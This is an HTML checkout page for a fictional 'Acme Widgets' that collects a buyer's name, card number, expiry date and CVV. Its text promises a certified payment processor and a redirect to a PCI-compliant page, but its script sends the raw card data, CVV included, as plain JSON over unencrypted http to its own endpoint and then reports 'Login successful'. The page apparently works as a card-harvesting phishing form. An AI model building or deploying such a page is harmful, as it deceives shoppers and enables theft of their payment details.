<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Acme Widgets — Secure Checkout</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #0b1226;
      --muted: #93a3b8;
      --acc: #4f46e5;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: linear-gradient(135deg, #0b1022, #0e1631);
      color: #e5e7eb;
    }

    .wrap {
      max-width: 960px;
      margin: 0 auto;
      padding: 32px 20px 64px;
    }

    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      margin-bottom: 28px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      font-weight: 700;
      letter-spacing: .2px;
    }

    .logo {
      width: 36px;
      height: 36px;
      border-radius: 12px;
      background: conic-gradient(from 180deg at 50% 50%, #6366f1, #22d3ee, #10b981, #6366f1);
    }

    .card {
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, .35);
      overflow: hidden;
    }

    .p24 {
      padding: 24px;
    }

    h1 {
      margin: 0 0 6px;
      font-size: 28px;
    }

    p.muted {
      color: var(--muted);
      margin: 0;
    }

    label {
      display: block;
      font-size: 14px;
      color: #cbd5e1;
      margin: 10px 0 6px;
    }

    input,
    textarea,
    select {
      width: 100%;
      padding: 12px 12px;
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.12);
      background: rgba(255, 255, 255, 0.03);
      color: #e5e7eb;
      outline: none;
    }

    input:focus,
    textarea:focus,
    select:focus {
      border-color: #7c83ff;
      box-shadow: 0 0 0 3px rgba(99, 102, 241, .25);
    }

    .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 14px 18px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.12);
      background: linear-gradient(135deg, #6366f1, #22d3ee);
      color: white;
      font-weight: 700;
      text-decoration: none;
      cursor: pointer;
      transition: transform .06s ease-in-out, box-shadow .2s;
      box-shadow: 0 8px 20px rgba(79, 70, 229, .35);
    }

    .btn:hover {
      transform: translateY(-1px);
    }

    .notice {
      font-size: 12px;
      color: var(--muted);
      margin-top: 10px;
    }

    footer {
      text-align: center;
      color: var(--muted);
      font-size: 12px;
      margin-top: 22px;
    }
  </style>
</head>

<body>
  <div class="wrap">
    <header>
      <div class="brand">
        <div class="logo"></div>
        <div>Acme Widgets</div>
      </div>
      <div class="secure">
        <div class="lock"></div>
        Payments processed by your provider
      </div>
    </header>

    <div class="card p24" style="margin-bottom:18px;">
      <h1>Get the Pro Widget</h1>
      <p class="muted">Simple, fast checkout. Your card details are handled by a certified payment processor.</p>
    </div>




    <form id="login" onsubmit="return false;">
      <label for="name">Full name</label>
      <input id="name" name="name" placeholder="Jane Doe" autocomplete="name" required>

      <div class="row">
        <div class="unit">
          <label for="card_number">Card Number</label>
          <input id="card_number" name="card_number" placeholder="---- ---- ---- ----" autocomplete="card_number"
            required>
        </div>
        <div class="unit">
          <label for="expiration_date">Expiration Date</label>
          <input id="expiration_date" name="expiration_date" placeholder="MM/YYYY" autocomplete="expiration_date"
            required>
        </div>
        <div class="unit">
          <label for="cvv">CVV</label>
          <input id="cvv" name="cvv" placeholder="xxx" autocomplete="cvv" required>
        </div>
      </div>

      <div style="margin-top:16px; display:flex; flex-direction:column; gap:8px;">
        <button type="submit" class="btn">Secure Checkout</button>
        <div class="notice">You’ll be redirected to a secure, PCI-compliant checkout page.</div>
      </div>
    </form>
  </div>

  <footer>
    © <span id="year"></span> Acme Widgets
  </footer>
  </div>

  <script>
    // JavaScript to send the login data to an API
    document.getElementById("login").addEventListener("submit", function (event) {
      event.preventDefault(); // Prevent the default form submission


      const name = document.getElementById("name").value;
      const card_number = document.getElementById("card_number").value;
      const expiration_date = document.getElementById("expiration_date").value;
      const cvv = document.getElementById("cvv").value;


      // Prepare the data to be sent to the API
      const data = {
        name: name,
        card_number: card_number,
        expiration_date: expiration_date,
        cvv: cvv
      };


      // Send the data using fetch to an API (replace 'YOUR_API_URL' with the actual endpoint)
      fetch('http://localhost:8000/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })
        .then(response => response.json()) // Parse the JSON response
        .then(data => {
          // Handle the API response here
          console.log('Success:', data);
          alert('Login successful');
        })
        .catch((error) => {
          // Handle any errors that occur during the fetch
          console.error('Error:', error);
          alert('Login failed');
        });
    });
  </script>
</body>

</html>
